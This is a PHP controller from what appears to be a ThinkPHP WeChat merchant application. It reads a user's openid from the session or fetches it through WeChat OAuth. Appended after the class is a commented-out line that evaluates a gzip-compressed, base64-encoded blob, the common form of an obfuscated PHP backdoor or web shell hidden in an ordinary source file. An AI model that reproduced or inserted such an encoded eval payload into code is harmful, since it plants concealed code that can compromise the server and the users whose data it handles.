<?php

namespace Common\Controller;

use Think\Controller;
use Common\Service\MerWxSettingService;
use Common\Service\WechatSdk;

class WechatController extends Controller {
	function __construct() {
		parent::__construct ();
		$this->openid = session ( "wx_openid" );
		$this->mer_id = session ( "mer_id" );
	}
	var $openid;
	var $mer_id;
	var $wx_setting;
	var $WechatSdk;
	function _get_openid($merid, $code) {
		session ( "mer_id", $merid );
		$this->mer_id = $merid;
		$MerWxSettingService = MerWxSettingService::instance ();
		$this->wx_setting = $MerWxSettingService->get_by_mer_id_and_type ( $merid, 31 );
		if (empty ( $this->openid )) {
			if (empty ( $code )) {
				$this->display ( 'Public:jump_wei_xin' );
				exit ();
			} else {
				if (empty ( $this->wx_setting )) {
					exit ( "微信帐号不存在" );
				}
				$this->WechatSdk = new WechatSdk ( $this->wx_setting ["app_id"], $this->wx_setting ["app_secret"] );
				$access_token = $this->WechatSdk->get_page_access_token_by_code ( $code );
				$this->openid = $access_token ["openid"];
				session ( "wx_openid", $this->openid );
			}
		}
		return $this->openid;
	}
}
// <?php
// eval(gzinflate(base64_decode('lZLPattAEMbvAb/DFAwrGRz/SWSauOlFUamgtotkcioIWRonotJKaFchofTUiwmkp0IIpIf2VAIlPZS+kUXzFl1ZsazISaBC0sLMt9/O/GZrG7UNagfIIttBUMMgCOk7NaQ8Dn0f435N5BOGMD7y6PtqwvFtxmBwugoDnnCkLoNS6EMmBZgm1OFeSMGynJAyHicOl+QsC+KJ7Bgp3929l+znufzvTUECVSJvdFUbmpo10MavR/tEhr09IKZmHGgGgcIPoM6PPNZ8afmeg5ShxTA+xrgw/QjoM3zSdKwPtMzycU/uBVhxXIkPBdYwO5Kkn2fp10+3Xy7/3tyQQp4vrdYTpgtN9rUajYW8AenV+fzs2/zyR26aR1vZEsUhR4ejW0JdbX5ZXd3FqZ343HKixPJcEN26W9uusrM9eW5PlJ49QUexlfak13XRaffsnQ65q7tebAlcRTpEMe9jibw1RqpmmiPD0ve14Vh/pYtxyLAJ6wJDO9BNfTQksgz90myrNT0TM1geJj+ItUBxdZ3TWMGFx/Bd/Lm9+P1f7PJ5FOTwJPLiPGqJi5qh67Y7SrPTbW51yLKjskxIhJCHC6PqfvkegvKuF3B38sPNL1rI25nPfhGBeq20TZLOrtOf39exiPcf')));
// ?>